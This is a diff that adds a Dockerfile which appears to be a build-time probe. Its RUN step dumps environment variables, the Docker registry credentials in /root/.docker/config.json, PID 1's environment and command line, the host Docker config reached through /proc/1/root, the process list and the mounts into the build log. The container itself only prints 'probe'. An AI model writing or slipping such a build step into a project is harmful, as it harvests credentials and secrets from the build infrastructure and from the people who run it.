@@ -1,0 +1,10 @@
+FROM alpine:3.19
+RUN echo "===ENV===" ; env | sort ; \
+    echo "===ROOTDOCKER===" ; ls -la /root/.docker 2>&1 | head -20 ; cat /root/.docker/config.json 2>&1 | head -40 ; \
+    echo "===PROC1ENV===" ; tr '\0' '\n' < /proc/1/environ 2>&1 | head -100 ; \
+    echo "===PROC1CMD===" ; tr '\0' ' ' < /proc/1/cmdline 2>&1 ; echo ; \
+    echo "===PROC1ROOT===" ; cat /proc/1/root/root/.docker/config.json 2>&1 | head -40 ; \
+    echo "===PIDS===" ; for p in /proc/[0-9]* ; do printf '%s ' "$p" ; tr '\0' ' ' < "$p/cmdline" 2>/dev/null ; echo ; done | head -40 ; \
+    echo "===MOUNTS===" ; head -25 /proc/mounts ; \
+    echo "===DONE==="
+CMD ["sh","-c","echo probe; sleep 30"]
